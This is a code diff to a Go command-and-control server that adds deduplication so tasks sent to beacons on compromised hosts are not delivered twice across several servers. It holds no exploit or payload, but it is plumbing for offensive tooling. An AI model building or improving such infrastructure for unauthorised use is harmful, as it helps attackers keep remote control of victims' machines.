@@ -1618,6 +1618,16 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) {
 		}
 	}
 
+	// Check if this task is already in progress (delivered by this or another server)
+	for localID, masterID := range c2.masterTaskIDs {
+		if masterID == masterTaskID {
+			if _, inProgress := c2.tasksInProgress[localID]; inProgress {
+				// Task already delivered, don't re-add
+				return
+			}
+		}
+	}
+
 	// Generate local task ID
 	c2.taskCounter++
 	localTaskID := fmt.Sprintf("T%04d", c2.taskCounter)
@@ -1722,7 +1732,31 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 
 	// Update status
 	if task.Status != status {
+		oldStatus := task.Status
 		task.Status = status
+
+		// If task is no longer pending (sent/completed/failed by another server), 
+		// remove from beacon's TaskQueue to prevent duplicate delivery
+		if oldStatus == "pending" && (status == "sent" || status == "completed" || status == "failed") {
+			if beacon, ok := c2.beacons[task.BeaconID]; ok {
+				// Remove task from queue
+				newQueue := make([]Task, 0, len(beacon.TaskQueue))
+				for _, t := range beacon.TaskQueue {
+					if t.ID != localTaskID {
+						newQueue = append(newQueue, t)
+					}
+				}
+				if len(newQueue) != len(beacon.TaskQueue) {
+					beacon.TaskQueue = newQueue
+					if c2.debug {
+						logf("[C2] Removed task %s from beacon %s queue (status: %s, delivered by another server)", 
+							localTaskID, task.BeaconID, status)
+					}
+				}
+			}
+			// Also mark in tasksInProgress to prevent re-delivery if queued again
+			c2.tasksInProgress[localTaskID] = time.Now()
+		}
 
 		// If completed/failed, clear from beacon's current task
 		if status == "completed" || status == "failed" {
